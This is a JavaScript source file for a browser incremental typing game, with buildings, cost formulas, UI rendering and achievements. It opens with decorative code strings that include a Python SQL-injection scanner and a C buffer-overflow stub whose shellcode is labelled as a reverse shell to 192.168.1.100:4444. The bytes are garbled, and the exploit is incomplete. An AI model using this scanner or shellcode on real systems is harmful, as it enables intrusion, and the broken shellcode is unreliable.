        <span class="variable">params</span> = <span class="variable">self</span>.<span class="function">extract_parameters</span>()
        <span class="variable">original_value</span> = <span class="variable">params</span>.<span class="function">get</span>(<span class="variable">param_name</span>, <span class="string">''</span>)
        <span class="variable">params</span>[<span class="variable">param_name</span>] = <span class="variable">payload</span>
        
        <span class="variable">parsed_url</span> = <span class="function">urlparse</span>(<span class="variable">self</span>.<span class="variable">target_url</span>)
        <span class="variable">base_url</span> = <span class="function">urljoin</span>(<span class="variable">self</span>.<span class="variable">target_url</span>, <span class="variable">parsed_url</span>.<span class="variable">path</span>)
        <span class="variable">injected_url</span> = <span class="variable">base_url</span> + <span class="string">"?"</span> + <span class="function">urlencode</span>(<span class="variable">params</span>)
        
        <span class="function">print</span>(<span class="string">f"[*] Testing: {param_name} with payload: {payload}"</span>)
        
        <span class="keyword">try</span>:
            <span class="variable">start_time</span> = <span class="function">time</span>.<span class="function">time</span>()
            <span class="variable">response</span> = <span class="function">requests</span>.<span class="function">get</span>(<span class="variable">injected_url</span>, <span class="variable">headers</span>=<span class="variable">self</span>.<span class="variable">headers</span>, <span class="variable">cookies</span>=<span class="variable">self</span>.<span class="variable">cookies</span>, <span class="variable">timeout</span>=<span class="number">10</span>)
            <span class="variable">elapsed_time</span> = <span class="function">time</span>.<span class="function">time</span>() - <span class="variable">start_time</span>
            
            <span class="comment"># Check for time-based vulnerabilities</span>
            <span class="keyword">if</span> <span class="string">"WAITFOR DELAY"</span> <span class="keyword">in</span> <span class="variable">payload</span> <span class="keyword">or</span> <span class="string">"SLEEP"</span> <span class="keyword">in</span> <span class="variable">payload</span>:
                <span class="keyword">if</span> <span class="variable">elapsed_time</span> >= <span class="number">5</span>:
                    <span class="function">print</span>(<span class="string">f"[+] Time-based SQL injection found in parameter: {param_name}"</span>)
                    <span class="keyword">return</span> <span class="keyword">True</span>
            
            <span class="comment"># Check for error-based or union-based vulnerabilities</span>
            <span class="keyword">for</span> <span class="variable">pattern</span> <span class="keyword">in</span> <span class="variable">self</span>.<span class="variable">error_patterns</span>:
                <span class="keyword">if</span> <span class="variable">pattern</span> <span class="keyword">in</span> <span class="variable">response</span>.<span class="variable">text</span>:
                    <span class="function">print</span>(<span class="string">f"[+] SQL error detected with payload: {payload}"</span>)
                    <span class="function">print</span>(<span class="string">f"[+] Parameter {param_name} is vulnerable!"</span>)
                    <span class="keyword">return</span> <span class="keyword">True</span>
                    
        <span class="keyword">except</span> <span class="variable">Exception</span> <span class="keyword">as</span> <span class="variable">e</span>:
            <span class="function">print</span>(<span class="string">f"[-] Error testing parameter {param_name}: {str(e)}"</span>)
            
        <span class="keyword">return</span> <span class="keyword">False</span>
        
    <span class="keyword">def</span> <span class="function">scan</span>(<span class="variable">self</span>):
        <span class="function">print</span>(<span class="string">"\n[+] Starting SQL Injection scan..."</span>)
        <span class="variable">params</span> = <span class="variable">self</span>.<span class="function">extract_parameters</span>()
        
        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable">params</span>:
            <span class="function">print</span>(<span class="string">"[-] No GET parameters found in the URL."</span>)
            <span class="keyword">return</span>
            
        <span class="function">print</span>(<span class="string">f"[*] Found {len(params)} parameters to test: {', '.join(params.keys())}"</span>)
        
        <span class="keyword">with</span> <span class="function">ThreadPoolExecutor</span>(<span class="variable">max_workers</span>=<span class="number">5</span>) <span class="keyword">as</span> <span class="variable">executor</span>:
            <span class="keyword">for</span> <span class="variable">param</span> <span class="keyword">in</span> <span class="variable">params</span>:
                <span class="keyword">for</span> <span class="variable">payload</span> <span class="keyword">in</span> <span class="variable">self</span>.<span class="variable">injection_payloads</span>:
                    <span class="variable">future</span> = <span class="variable">executor</span>.<span class="function">submit</span>(<span class="variable">self</span>.<span class="function">test_parameter</span>, <span class="variable">param</span>, <span class="variable">payload</span>)
                    <span class="keyword">if</span> <span class="variable">future</span>.<span class="function">result</span>():
                        <span class="variable">self</span>.<span class="variable">vulnerable_params</span>.<span class="function">append</span>((<span class="variable">param</span>, <span class="variable">payload</span>))
        
        <span class="keyword">if</span> <span class="variable">self</span>.<span class="variable">vulnerable_params</span>:
            <span class="function">print</span>(<span class="string">"\n[+] Scan complete! Vulnerable parameters found:"</span>)
            <span class="keyword">for</span> <span class="variable">param</span>, <span class="variable">payload</span> <span class="keyword">in</span> <span class="variable">self</span>.<span class="variable">vulnerable_params</span>:
                <span class="function">print</span>(<span class="string">f"  - Parameter: {param}, Payload: {payload}"</span>)
        <span class="keyword">else</span>:
            <span class="function">print</span>(<span class="string">"\n[-] Scan complete. No SQL injection vulnerabilities found."</span>)`,

    // Buffer Overflow Exploit 
    `<span class="comment">/* Buffer Overflow Exploit for CVE-2022-34791 */</span>
<span class="keyword">#include</span> <span class="string">&lt;stdio.h&gt;</span>
<span class="keyword">#include</span> <span class="string">&lt;stdlib.h&gt;</span>
<span class="keyword">#include</span> <span class="string">&lt;string.h&gt;</span>
<span class="keyword">#include</span> <span class="string">&lt;unistd.h&gt;</span>
<span class="keyword">#include</span> <span class="string">&lt;sys/socket.h&gt;</span>
<span class="keyword">#include</span> <span class="string">&lt;netinet/in.h&gt;</span>
<span class="keyword">#include</span> <span class="string">&lt;arpa/inet.h&gt;</span>

<span class="comment">/* Shellcode - reverse shell to 192.168.1.100:4444 */</span>
<span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="variable">shellcode</span>[] = {
    <span class="comment">/* Push sock = socket(AF_INET, SOCK_STREAM, 0) */</span>
    <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xdb</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>,
    <span class="number">0x66</span>, <span class="number">0xb8</span>, <span class="number">0x67</span>, <span class="number">0x01</span>, <span class="number">0xb3</span>, <span class="number">0x02</span>, <span class="number">0xb1</span>, <span class="number">0x01</span>,
    <span class="number">0xcd</span>, <span class="number">0x80</span>, <span class="comment">/* Pop sock to ebx */</span>
    <span class="number">0x89</span>, <span class="number">0xc3</span>, <span class="comment">/* Push sockaddr_in struct */</span>
    <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x50</span>, <span class="number">0x68</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x5c</span>,
    <span class="number">0x66</span>, <span class="number">0x68</span>, <span class="number">0x11</span>, <span class="number">5c</span>, <span class="number">66</span>, <span class="number">6a</span>, <span class="number">02</span>, <span class="number">89</span>,
    <span class="number">0xe1</span>, <span class="number">b0</span>, <span class="number">66</span>, <span class="number">cd</span>, <span class="number">80</span>, <span class="comment">/* Pop sockaddr_in to ecx */</span>
    <span class="number">89</span>, <span class="number">c1</span>, <span class="comment">/* Connect(sock, sockaddr_in, 16) */</span>
    <span class="number">31</span>, <span class="number">c0</span>, <span class="number">50</span>, <span class="number">b0</span>, <span class="number">66</span>, <span class="number">cd</span>, <span class="number">80</span>,
    <span class="comment">/* Dup2(sock, 0, 1, 2) */</span>
    <span class="number">31</span>, <span class="number">c0</span>, <span class="number">50</span>, <span class="number">b0</span>, <span class="number">66</span>, <span class="number">cd</span>, <span class="number">80</span>,
    <span class="number">31</span>, <span class="number">c0</span>, <span class="number">50</span>, <span class="number">b0</span>, <span class="number">66</span>, <span class="number">cd</span>, <span class="number">80</span>,
    <span class="number">31</span>, <span class="number">c0</span>, <span class="number">50</span>, <span class="number">b0</span>, <span class="number">66</span>, <span class="number">cd</span>, <span class="number">80</span>,
    <span class="comment">/* Execve("/bin/sh", NULL, NULL) */</span>
    <span class="number">31</span>, <span class="number">c0</span>, <span class="number">50</span>, <span class="number">68</span>, <span class="number">2f</span>, <span class="number">2f</span>, <span class="number">73</span>, <span class="number">68</span>,
    <span class="number">2f</span>, <span class="number">62</span>, <span class="number">69</span>, <span class="number">6e</span>, <span class="number">89</span>, <span class="number">e3</span>, <span class="number">50</span>, <span class="number">89</span>,
    <span class="number">e2</span>, <span class="number">53</span>, <span class="number">89</span>, <span class="number">e1</span>, <span class="number">b0</span>, <span class="number">0b</span>, <span class="number">cd</span>,
    <span class="number">80</span>
};
`
];
/**
* Applies all multiplier modifiers to the base production of a building.
* @param {number} buildingId ID of the building (0 for manually typed words)
* @param {number} baseProduction Base production of the building
* @returns {number} Production after modifiers
*/
function applyModifiers(buildingId, baseProduction) {
    let totalMultiplier = 1;
    modifiers.forEach(modifier => {
        if (modifier.affectedBuildings && modifier.affectedBuildings.includes(buildingId)) {
            totalMultiplier *= typeof modifier.getMultiplier === "function"
            ? modifier.getMultiplier()
            : modifier.multiplier || 1;
        }
    });
    return baseProduction * totalMultiplier;
}
function applyNonTempModifiers(buildingId, baseProduction) {
    let totalMultiplier = 1;
    modifiers.forEach(modifier => {
        if (!modifier.duration && modifier.affectedBuildings && modifier.affectedBuildings.includes(buildingId)) {
            totalMultiplier *= typeof modifier.getMultiplier === "function"
            ? modifier.getMultiplier()
            : modifier.multiplier || 1;
        }
    });
    return baseProduction * totalMultiplier;
}
/**
* Applies all research multiplier modifiers to the base research of a building
* @param {*} buildingId ID of the building
* @param {*} baseProduction Base research of the building
* @returns 
*/
function applyResearchModifiers(buildingId, baseProduction) {
    let totalMultiplier = 1;
    modifiers.forEach(modifier => {
        if (modifier.affectedBuildings && modifier.affectedBuildings.includes(buildingId)) {
            totalMultiplier *= typeof modifier.getResearchMultiplier === "function"
            ? modifier.getResearchMultiplier()
            : modifier.researchMultiplier || 1;
        }
    });
    return baseProduction * totalMultiplier;
}
/**
* Applies passive income to manual keystrokes.
* @param {number} keystrokes Manual keystrokes.
* @returns {number} Manual keystrokes + passive income % to manual.
*/
function applyKPStoManual(keystrokes) {
    let totalMultiplier = 0;
    modifiers.forEach(modifier => {
        if (modifier.affectedBuildings && modifier.affectedBuildings.includes(0)) {
            totalMultiplier += typeof modifier.getKPStoManual === "function"
            ? modifier.getKPStoManual()
            : modifier.KPStoManual || 0;
        }
    });
    return keystrokes + (keystrokes * totalMultiplier * getPassiveIncome());
}

function getBuildingCost(building) {
    const growthFactor = 1.15;
    let cost = building.baseCost * Math.pow(growthFactor, building.level) * (building.level + 1);
    let ITOfficeReduction = Math.max(0.8, Math.pow(0.995, ITOffice.level));
    return Math.ceil(cost * ITOfficeReduction);
}

function getSpecialBoost(building) {
    if(building.id === AutoWriter.id) {
        return `${(AutoWriter.level * 5).toFixed(2)}% boost to manual keystrokes`;
    } else if (building.id === Printer.id) {
        return `${(Printer.level * 0.75).toFixed(2)}% boost to all buildings`;
    } else if (building.id === ResearchLab.id) {
        return `${formatShortScale(ResearchLab.getResearchProduce())} research points per second`;
    } else if (building.id === CyberCafe.id) {
        return `${((1 - Math.pow(0.9995, CyberCafe.level)) * 100).toFixed(2)}% offline keystroke production`;
    } else if (building.id === ServerFarm.id) {
        return `${(ServerFarm.level * 0.1).toFixed(2)}% of passive income to manual keystrokes`;
    } else if (building.id === ITOffice.id) {
        return `${(100 - (Math.max(0.8, Math.pow(0.995, ITOffice.level)) * 100)).toFixed(2)}% discount on all buildings`;
    }
    return '';
}

const AutoWriter = {
    id: 1,
    name: "Auto Writer",
    description: "Improves value of manually typed words.",
    trivia: "Gives you a break from typing.",
    lockdescription: "Unlocks at 100 total keystrokes.",
    special: "Unlocks wordle minigame. Each Auto Writer increases manually typed words production by 5%.",
    unlockCondition: () => { return totalKeystrokes >= 100; },
    locked: true,
    baseCost: 100,
    baseProduce: 1,
    level: 0,
    totalProduce: 0,
};

const Printer = {
    id: 2,
    name: "Printer",
    description: "Improves income from all buildings.",
    trivia: "You can print keystrokes?",
    lockdescription: "Unlocks at 500 total keystrokes.",
    special: "Unlocks 'Reports' button in the navbar. Each Printer increases all buildings income by 0.75%.",
    unlockCondition: () => { return totalKeystrokes >= 500; },
    locked: true,
    baseCost: 500,
    baseProduce: 5,
    level: 0,
    totalProduce: 0,
};

const ResearchLab = {
    id: 3,
    name: "Research Lab",
    description: "Research new typing techniques.",
    trivia: "Lab coat not included.",
    lockdescription: "Unlocks at 2,000 total keystrokes.",
    special: "Unlocks research system. Grants research points.",
    unlockCondition: () => { return totalKeystrokes >= 2_000; },
    locked: true,
    baseCost: 2000,
    baseProduce: 20,
    getResearchProduceSingle: () => { return applyResearchModifiers(ResearchLab.id, 0.5); },
    getResearchProduce: () => { return ResearchLab.getResearchProduceSingle() * ResearchLab.level; },
    level: 0,
    totalProduce: 0,
};

const CyberCafe = {
    id: 4,
    name: "Cyber Cafe",
    description: "Provides free Wi-Fi and boosts offline production.",
    trivia: "Free Wi-Fi included.",
    lockdescription: "Unlocks at 10,000 total keystrokes.",
    special: "Increases offline keystroke production.",
    unlockCondition: () => { return totalKeystrokes >= 10_000; },
    locked: true,
    baseCost: 10000,
    baseProduce: 50,
    level: 0,
    totalProduce: 0,
};

const ServerFarm = {
    id: 5,
    name: "Server Farm",
    description: "Provides passive income to manual keystrokes.",
    trivia: "It's not a real farm.",
    lockdescription: "Unlocks at 50,000 total keystrokes.",
    special: "Each Server Farm adds 0.1% of passive income to manual keystrokes.",
    unlockCondition: () => { return totalKeystrokes >= 50_000; },
    locked: true,
    baseCost: 50000,
    baseProduce: 200,
    level: 0,
    totalProduce: 0,
};

const TypingArena = {
    id: 6,
    name: "Typing Arena",
    description: "Compete in typing races and earn buffs based on your performance.",
    trivia: "No, you can't use autocorrect.",
    lockdescription: "Unlocks at 100,000 total keystrokes.",
    special: "Unlocks 'Arena' button in the navbar.",
    unlockCondition: () => totalKeystrokes >= 100_000,
    locked: true,
    baseCost: 100000,
    baseProduce: 500,
    level: 0,
    totalProduce: 0,
};

const ITOffice = {
    id: 7,
    name: "IT Office",
    description: "Buildings cost less with each IT Office.",
    trivia: "Have you tried turning it off and on again?",
    lockdescription: "Unlocks at 200,000 total keystrokes.",
    special: "Decreases the cost of all buildings by 0.5%. (Capped at 20%)",
    unlockCondition: () => totalKeystrokes >= 200_000,
    locked: true,
    baseCost: 200000,
    baseProduce: 1000,
    level: 0,
    totalProduce: 0,
};

const StockMarket = {
    id: 8,
    name: "Stock Market",
    description: "Invest keystrokes in the stock market.",
    trivia: "Buy low, sell high.",
    lockdescription: "Unlocks at 500,000 total keystrokes.",
    special: "Unlocks 'Stock Market' button in the navbar.",
    unlockCondition: () => totalKeystrokes >= 500_000,
    locked: true,
    baseCost: 500000,
    baseProduce: 2000,
    level: 0,
    totalProduce: 0,
};
const MagazinePublisher = {
    id: 9,
    name: "Magazine Publisher",
    description: "Publishes typing magazines.",
    trivia: "The only magazine about typing.",
    lockdescription: "Unlocks at 1,000,000 total keystrokes.",
    special: "Publishes news every 20 seconds. Some news are golden. Clicking on golden news gives a temporary boost.",
    unlockCondition: () => totalKeystrokes >= 1_000_000,
    locked: true,
    baseCost: 1000000,
    baseProduce: 5000,
    level: 0,
    totalProduce: 0,
}
const TypingGuild = {
    id: 10,
    name: "Typing Guild",
    description: "Setup a guild of typing enthusiasts.",
    trivia: "Guild meetings are held in the Typing Arena.",
    lockdescription: "Unlocks at 2,000,000 total keystrokes.",
    special: "Unlocks 'Guild' button in the navbar.",
    unlockCondition: () => totalKeystrokes >= 2_000_000,
    locked: true,
    baseCost: 2000000,
    baseProduce: 10_000,
    level: 0,
    totalProduce: 0,
}
const HackerGroup = {
    id: 11,
    name: "Hacker Group",
    description: "Recruit hackers to help your keystroke business.",
    trivia: "Ethical hacking only.",
    lockdescription: "Unlocks at 100,000,000 total keystrokes.",
    special: "Unlocks 'Hacker' button in the navbar.",
    unlockCondition: () => totalKeystrokes >= 100_000_000,
    locked: true,
    baseCost: 100_000_000,
    baseProduce: 500_000,
    level: 0,
    totalProduce: 0,
}

const GameArcade = {
    id: 12,
    name: "Game Arcade",
    description: "Setup a game arcade with typing games.",
    trivia: "No, you can't play Fortnite here.",
    lockdescription: "Unlocks at 1,000,000,000 total keystrokes.",
    special: "Unlocks 'Arcade' button in the navbar.",
    unlockCondition: () => totalKeystrokes >= 1_000_000_000,
    locked: true,
    baseCost: 1_000_000_000,
    baseProduce: 4_000_000,
    level: 0,
    totalProduce: 0,
}

const KeystrokeCasino = {
    id: 13,
    name: "Keystroke Casino",
    description: "Setup a casino for typing enthusiasts.",
    trivia: "The house always wins.",
    lockdescription: "Unlocks at 100,000,000,000 total keystrokes.",
    special: "Unlocks 'Casino' button in the navbar.",
    unlockCondition: () => totalKeystrokes >= 100_000_000_000,
    locked: true,
    baseCost: 100_000_000_000,
    baseProduce: 400_000_000,
    level: 0,
    totalProduce: 0,
}
const AIAgent = {
    id: 14,
    name: "AI Agent",
    description: "Deploy AI to generate keystrokes.",
    trivia: "AI-generated keystrokes.",
    lockdescription: "Unlocks at 1,000,000,000,000 total keystrokes.",
    special: "Unlocks 'Memory' button in the navbar. Zero human interaction required at the stock market.",
    unlockCondition: () => totalKeystrokes >= 1_000_000_000_000,
    locked: true,
    baseCost: 1_000_000_000_000,
    baseProduce: 5_000_000_000,
    level: 0,
    totalProduce: 0,
}


const buildings = [
    AutoWriter, Printer, ResearchLab, CyberCafe, ServerFarm, TypingArena, ITOffice, StockMarket, MagazinePublisher, TypingGuild, HackerGroup, GameArcade, KeystrokeCasino, AIAgent
];

buildings.forEach(building => {
    building.getCost = () => getBuildingCost(building);
    building.getProduceSingle = () => applyModifiers(building.id, building.baseProduce);
    building.getProduce = () => building.getProduceSingle() * building.level;
});

let totalResearchPoints = 0;

function initBuildings() {
    const buildingsContainer = document.getElementById('buildings-container');
    buildingsContainer.innerHTML = '';
    
    buildings.forEach((building, index) => {
        const buildingItem = document.createElement('div');
        buildingItem.className = 'building-item';
        buildingItem.setAttribute('data-index', index);
        buildingItem.style.animationDelay = `${index * 0.05}s`;
        
        // Create the HTML structure for horizontal building item
        buildingItem.innerHTML = `
            <div class="building-icon">
                <img src="/images/buildings/128/${building.id}${building.locked ? '-locked' : ''}.png" alt="${building.name}">
                <div class="building-level">Lvl ${building.level}</div>
            </div>
            <div class="building-info">
                <div class="building-header">
                    <h3 class="building-name">${building.locked ? 'Unknown Building' : building.name}</h3>
                    <div class="building-price">${formatShortScale(getBuildingCost(building))}</div>
                </div>
                <p class="building-description">${building.locked ? building.lockdescription : building.description}</p>
                <div class="building-stats">
                    <div class="stat">
                        <span class="stat-label">Production:</span>
                        <span class="stat-value production-value">${building.level > 0 && !building.locked ? formatShortScale(building.getProduceSingle()) + '/sec' : '-'}</span>
                    </div>
                    <div class="stat">
                        <span class="stat-label">Total:</span>
                        <span class="stat-value total-production-value">${building.level > 0 && !building.locked ? formatShortScale(building.getProduce()) + '/sec' : '-'}</span>
                    </div>
                    <div class="stat">
                        <span class="stat-label">Efficiency:</span>
                        <span class="stat-value efficiency-value">${building.level > 0 && !building.locked && building.getProduceSingle() > 0 ? formatShortScale(getBuildingCost(building) / building.getProduceSingle()) + '/key' : 'N/A'}</span>
                    </div>
                </div>
                <div class="building-actions">
                    <button class="buy-btn buy-1x" data-index="${index}" data-amount="1">
                        Buy 1x (${formatShortScale(getBuildingCost(building))})
                    </button>
                    <button class="buy-btn buy-10x" data-index="${index}" data-amount="10">
                        Buy 10x (${formatShortScale(calculateBulkCost(building, 10))})
                    </button>
                    <button class="buy-btn buy-100x" data-index="${index}" data-amount="100">
                        Buy 100x (${formatShortScale(calculateBulkCost(building, 100))})
                    </button>
                </div>
            </div>
        `;

        
        
        // Add event listeners for purchase buttons
        const buy1xBtn = buildingItem.querySelector('.buy-1x');
        const buy10xBtn = buildingItem.querySelector('.buy-10x');
        const buy100xBtn = buildingItem.querySelector('.buy-100x');
        
        buy1xBtn.addEventListener('click', () => {
            if (keystrokesBank >= getBuildingCost(building) && !building.locked) {
                buyBuilding(index);
            }
        });
        
        buy10xBtn.addEventListener('click', () => {
            const cost = calculateBulkCost(building, 10);
            if (keystrokesBank >= cost && !building.locked) {
                buyBuildingBulk(index, 10);
            }
        });
        
        buy100xBtn.addEventListener('click', () => {
            const cost = calculateBulkCost(building, 100);
            if (keystrokesBank >= cost && !building.locked) {
                buyBuildingBulk(index, 100);
            }
        });
          buildingsContainer.appendChild(buildingItem);
    });
}

// Old updateBuildingCard function removed - now using individual building items

function handleMouseMoveBuildingRotate(event) {
    const building = event.currentTarget;
    const rect = building.getBoundingClientRect();
    const x = event.clientX - rect.left;
    const y = event.clientY - rect.top;
    const centerX = rect.width / 2;
    const centerY = rect.height / 2;
    const rotateX = ((y - centerY) / centerY) * -25; // Adjust the multiplier for more/less tilt
    const rotateY = ((x - centerX) / centerX) * 25; // Adjust the multiplier for more/less tilt
    
    building.style.setProperty('--rotateX', `${rotateX}deg`);
    building.style.setProperty('--rotateY', `${rotateY}deg`);
}

function handleMouseLeaveBuildingRotate(event) {
    const building = event.currentTarget;
    building.style.setProperty('--rotateX', `0deg`);
    building.style.setProperty('--rotateY', `0deg`);
}

function displayBuildings() {
    const buildingsContainer = document.getElementById('buildings-container');
    
    if(ResearchLab.level > 0) {
        document.getElementById('research-tab').disabled = false;
    }
    
    buildingsContainer.querySelectorAll('.building-item').forEach((buildingElement, index) => {
        const building = buildings[index];
        if (building.locked) {
            if (building.unlockCondition()) {
                building.locked = false;
            }
        }
        updateBuildingItem(buildingElement, building);
    });
}

function updateBuildingItem(buildingElement, building) {
    const cost = getBuildingCost(building);
    const cost10x = calculateBulkCost(building, 10);
    const cost100x = calculateBulkCost(building, 100);
    const isAffordable1x = cost <= keystrokesBank;
    const isAffordable10x = cost10x <= keystrokesBank;
    const isAffordable100x = cost100x <= keystrokesBank;
    
    // Update building icon and image
    const iconImg = buildingElement.querySelector('.building-icon img');
    const levelElement = buildingElement.querySelector('.building-level');
    const nameElement = buildingElement.querySelector('.building-name');
    const descriptionElement = buildingElement.querySelector('.building-description');
    const priceElement = buildingElement.querySelector('.building-price');
    
    // Update production stats
    const productionValue = buildingElement.querySelector('.production-value');
    const totalProductionValue = buildingElement.querySelector('.total-production-value');
    const efficiencyValue = buildingElement.querySelector('.efficiency-value');
    
    // Update purchase buttons
    const buy1xBtn = buildingElement.querySelector('.buy-1x');
    const buy10xBtn = buildingElement.querySelector('.buy-10x');
    const buy100xBtn = buildingElement.querySelector('.buy-100x');
    
    if (building.locked) {
        // Update locked building display
        iconImg.src = `/images/buildings/128/${building.id}-locked.png`;
        nameElement.textContent = 'Unknown Building';
        descriptionElement.textContent = building.lockdescription;
        levelElement.textContent = `Lvl ${building.level}`;
        priceElement.textContent = formatShortScale(cost);
        
        // Clear stats for locked buildings
        productionValue.textContent = '-';
        totalProductionValue.textContent = '-';
        efficiencyValue.textContent = 'N/A';
        
        // Disable all purchase buttons
        buy1xBtn.disabled = true;
        buy10xBtn.disabled = true;
        buy100xBtn.disabled = true;
        
        buildingElement.classList.remove('affordable');
        buildingElement.classList.add('locked');
    } else {
        // Update unlocked building display
        iconImg.src = `/images/buildings/128/${building.id}.png`;
        nameElement.textContent = building.name;
        descriptionElement.textContent = building.description;
        levelElement.textContent = `Lvl ${building.level}`;
        priceElement.textContent = formatShortScale(cost);
        
        // Update production stats
        productionValue.textContent = building.level > 0 ? `${formatShortScale(building.getProduceSingle())}/sec` : '-';
        totalProductionValue.textContent = building.level > 0 ? `${formatShortScale(building.getProduce())}/sec` : '-';
        efficiencyValue.textContent = building.level > 0 && building.getProduceSingle() > 0 ? 
            `${formatShortScale(cost / building.getProduceSingle())}/key` : 'N/A';
        
        // Update purchase buttons
        buy1xBtn.disabled = !isAffordable1x;
        buy10xBtn.disabled = !isAffordable10x;
        buy100xBtn.disabled = !isAffordable100x;
        
        buy1xBtn.textContent = `Buy 1x (${formatShortScale(cost)})`;
        buy10xBtn.textContent = `Buy 10x (${formatShortScale(cost10x)})`;
        buy100xBtn.textContent = `Buy 100x (${formatShortScale(cost100x)})`;
        
        // Toggle affordability classes
        buildingElement.classList.toggle('affordable', isAffordable1x);
        buildingElement.classList.remove('locked');
    }
}

// Add this helper function to format time values
function formatTime(seconds) {
    if (seconds < 60) {
        return `${seconds.toFixed(1)} seconds`;
    } else if (seconds < 3600) {
        return `${(seconds / 60).toFixed(1)} minutes`;
    } else if (seconds < 86400) {
        return `${(seconds / 3600).toFixed(1)} hours`;
    } else {
        return `${(seconds / 86400).toFixed(1)} days`;
    }
}


function buyBuilding(index) {
    const building = buildings[index];
    if (keystrokesBank >= getBuildingCost(building)) {
        keystrokesBank -= getBuildingCost(building);
        building.level += 1;
        updateStats();
        displayBuildings();
        playBuySound();
        gtag('event', 'building_purchase', {
            'event_category': 'engagement',
            'building': building.name,
            'level': building.level
        });
    }
}

/**
* 
* @returns {number} Total passive income from all buildings for 1 tick.
*/
function getPassiveIncome() {
    let passiveIncome = 0;
    buildings.forEach(building => {
        if (building.level > 0) {
            passiveIncome += building.getProduce();
        }
    });
    return passiveIncome;
}
function getPassiveIncomeWithoutTempBoosts() {
    let passiveIncome = 0;
    buildings.forEach(building => {
        if (building.level > 0) {
            passiveIncome += applyNonTempModifiers(building.id, building.baseProduce) * building.level;
        }
    });
    return passiveIncome;
}

function getResearchPoints() {
    return ResearchLab.getResearchProduce();
}

function generateKeystrokesAndResearchFromBuildings() {
    let totalProduction = 0;
    let totalResearch = 0;
    buildings.forEach(building => {
        const produce = building.getProduce() / Tickrate;
        building.totalProduce += produce;
        totalProduction += produce;
        if (typeof building.getResearchProduce === 'function') {
            totalResearch += building.getResearchProduce() / Tickrate;
        }
    });
    
    keystrokesBank += totalProduction;
    totalKeystrokes += totalProduction;
    totalResearchPoints += totalResearch;
    cashEarnedBuildings += totalProduction;
    
    updateStats();
    wordsToGenerate += totalProduction / 5; // 5 keystrokes per word
    if(wordsToGenerate >= 2) {
        wordsToGenerate = 2;
    }
}

function calculateBulkCost(building, amount) {
    const growthFactor = 1.15;
    let totalCost = 0;
    let currentLevel = building.level;
    
    // Calculate cost for each level increment
    for (let i = 0; i < amount; i++) {
        const levelCost = building.baseCost * Math.pow(growthFactor, currentLevel) * (currentLevel + 1);
        const ITOfficeReduction = Math.max(0.8, Math.pow(0.995, ITOffice.level));
        totalCost += Math.ceil(levelCost * ITOfficeReduction);
        currentLevel++;
    }
    
    return Math.ceil(totalCost);
}

function buyBuildingBulk(index, amount) {
    const building = buildings[index];
    const bulkCost = calculateBulkCost(building, amount);
    
    if (keystrokesBank >= bulkCost) {
        keystrokesBank -= bulkCost;
        building.level += amount;
        updateStats();
        displayBuildings();
        playBuySound();
        
        gtag('event', 'building_bulk_purchase', {
            'event_category': 'engagement',
            'building': building.name,
            'level': building.level,
            'amount': amount,
            'cost': bulkCost
        });
    }
}

const achievements = [
    {
        id: 1,
        name: "First Steps",
        description: "Reach 100 keystrokes.",
        trivia: "You're just getting started!",
        emoji: '🚀',
        unlocked: false,
        progress: () => totalKeystrokes,
        maxprogress: 100,
        showindex: 0,
        condition: () => totalKeystrokes >= 100
    },
    {
        id: 2,
        name: "Typing Enthusiast",
        description: "Reach 1000 keystrokes.",
        trivia: "You must really like typing!",
        emoji: '⌨️',
        unlocked: false,
        progress: () => totalKeystrokes,
        maxprogress: 1000,
        showindex: 1,
        condition: () => totalKeystrokes >= 1000
    },
    {
        id: 3,
        name: "Automator",
        description: "Own 5 Auto Writers.",
        trivia: "Let the robots do the work for you.",
        emoji: '🤖',
        unlocked: false,
        progress: () => AutoWriter.level,
        maxprogress: 5,
        showindex: 100,
        condition: () => AutoWriter.level >= 5
    },
    {
        id: 4,
        name: "Printing Press",
        description: "Own 3 Printers.",
        trivia: "You can print keystrokes? That's impressive!",
        emoji: '🖨️',
        unlocked: false,
        progress: () => Printer.level,
        maxprogress: 3,
        showindex: 200,
        condition: () => Printer.level >= 3
    },
    {
        id: 5,
        name: "Typing Master",
        description: "Reach 10,000 keystrokes.",
        trivia: "Your fingers must be getting a workout!",
        emoji: '🏆',
        unlocked: false,
        progress: () => totalKeystrokes,
        maxprogress: 10000,
        showindex: 2,
        condition: () => totalKeystrokes >= 10000
    },
    {
        id: 6,
        name: "Speed Demon",
        description: "Achieve a WPM of 100.",
        trivia: "Are you sure you're not a machine?",
        emoji: '💨',
        unlocked: false,
        progress: () => wpm,
        maxprogress: 100,
        showindex: 1000,
        condition: () => wpm >= 100
    },
    {
        id: 7,
        name: "Automation Expert",
        description: "Own 20 Auto Writers.",
        trivia: "Soon, you'll have an army of Auto Writers!",
        emoji: '🛠️',
        unlocked: false,
        progress: () => AutoWriter.level,
        maxprogress: 20,
        showindex: 101,
        condition: () => AutoWriter.level >= 20
    },
    {
        id: 8,
        name: "Printing Mogul",
        description: "Own 15 Printers.",
        trivia: "You're running a printing empire!",
        emoji: '🏭',
        unlocked: false,
        progress: () => Printer.level,
        maxprogress: 15,
        showindex: 201,
        condition: () => Printer.level >= 15
    },
    {
        id: 9,
        name: "Research Pioneer",
        description: "Own 10 Research Labs.",
        trivia: "e=mc^2",
        emoji: '🔬',
        unlocked: false,
        progress: () => ResearchLab.level,
        maxprogress: 10,
        showindex: 300,
        condition: () => ResearchLab.level >= 10
    },
    {
        id: 10,
        name: "Cyber Cafe Manager",
        description: "Own 5 Cyber Cafes.",
        trivia: "Quickest internet in town!",
        emoji: '☕',
        unlocked: false,
        progress: () => CyberCafe.level,
        maxprogress: 5,
        showindex: 400,
        condition: () => CyberCafe.level >= 5
    },
    {
        id: 11,
        name: "Server Farm Lord",
        description: "Own 3 Server Farms.",
        trivia: "Zettabytes of data!",
        emoji: '🖥️',
        unlocked: false,
        progress: () => ServerFarm.level,
        maxprogress: 3,
        showindex: 500,
        condition: () => ServerFarm.level >= 3
    },
    {
        id: 12,
        name: "Keystroke Tycoon",
        description: "Generate 100,000 keystrokes through buildings.",
        trivia: "Starting a small business.",
        emoji: '💰',
        unlocked: false,
        progress: () => cashEarnedBuildings,
        maxprogress: 100000,
        showindex: 1001,
